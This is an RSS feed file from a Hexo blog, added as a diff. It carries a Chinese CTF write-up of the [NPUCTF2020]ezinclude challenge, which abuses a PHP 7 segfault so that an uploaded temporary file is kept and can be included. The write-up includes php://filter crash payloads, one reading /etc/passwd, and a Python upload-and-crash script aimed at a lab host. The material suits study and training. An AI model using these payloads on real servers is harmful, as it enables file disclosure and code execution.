@@ -1,0 +1,80 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Hexo • Posts by &#34;php7 segment fault特性&#34; tag</title>
+        <link>http://odiws.github.io</link>
+        <description></description>
+        <language>en</language>
+        <pubDate>Fri, 07 Jun 2024 22:00:34 +0800</pubDate>
+        <lastBuildDate>Fri, 07 Jun 2024 22:00:34 +0800</lastBuildDate>
+        <category>buuctf</category>
+        <category>regexp注入</category>
+        <category>phar反序列化</category>
+        <category>thinkphpV6.0.0</category>
+        <category>php7 segment fault特性</category>
+        <category>zip加密</category>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/06/07/[NPUCTF2020]ezinclude/</guid>
+            <title>&#39;[NPUCTF2020]ezinclude&#39;</title>
+            <link>http://odiws.github.io/2024/06/07/[NPUCTF2020]ezinclude/</link>
+            <category>buuctf</category>
+            <category>php7 segment fault特性</category>
+            <pubDate>Fri, 07 Jun 2024 22:00:34 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;npuctf2020ezinclude&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#npuctf2020ezinclude&#34;&gt;#&lt;/a&gt; [NPUCTF2020]ezinclude&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;进去发现是用户名与密码错误&lt;/p&gt;
+&lt;p&gt;F12 发现提示：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;要 md5name 后的字符串等于 pass，不知道 pass，可以 bp 发现传送回来的东西有 hash 这个东西&lt;/p&gt;
+&lt;p&gt;直接加入 pass 等于这个 hash 值得到：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;得到 flflflflag.php 这个文件。&lt;/p&gt;
+&lt;p&gt;但是他会直接进到 404.html 文件&lt;/p&gt;
+&lt;p&gt;然后就不会了；接着就是大佬的操作了：&lt;/p&gt;
+&lt;p&gt;大佬看到了 php 的版本 7.0.33，直接就是：&lt;/p&gt;
+&lt;h4 id=&#34;php7-segment-fault特性&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php7-segment-fault特性&#34;&gt;#&lt;/a&gt; php7 segment fault 特性&lt;/h4&gt;
+&lt;p&gt;扫目录可得 dir.php&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;…… 扫不出来&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;向 PHP 发送含有文件区块的数据包时，让 PHP 异常崩溃退出，POST 的临时文件就会被保留&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;php &amp;lt; 7.2&lt;br&gt;
+php://filter/string.strip_tags/resource=/etc/passwd&lt;/li&gt;
+&lt;li&gt;php7 老版本通杀&lt;br&gt;
+ php://filter/convert.quoted-printable-encode/resource=data://,% bfAAAAAAAAAAAAAAAAAAAAAAA% ff% ff% ff% ff% ff% ff% ff% ffAAAAAAAAAAAAAAAAAAAAAAAA&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;嫖个脚本：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+from io import BytesIO
+
+mode1 = &amp;quot;php://filter/string.strip_tags/resource=/etc/passwd&amp;quot;
+mode2 = &amp;quot;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&amp;quot;
+url = &amp;quot;http://93fed8e6-341b-499c-b41b-0f0a6288549b.node4.buuoj.cn:81/flflflflag.php?file=&amp;quot;
+
+url = url + mode1
+payload = &amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot;
+
+files = &amp;#123;
+    &amp;quot;file&amp;quot;: BytesIO(payload.encode())
+&amp;#125;
+
+res = requests.post(url=url, files=files, allow_redirects=False)
+
+print(res.text)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;访问 dir.php：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;有个文件名，访问本地 file=/tmp/phpBWqZND&lt;/p&gt;
+&lt;p&gt;该脚本写了一个 php 探针：直接 bp 访问该文件&lt;/p&gt;
+&lt;p&gt;因为直接访问好像不能打开，会直接跳转到 404.html 文件里面，无法访问 php 探针。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;获取 flag，完成撒花～～～～～～～～&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
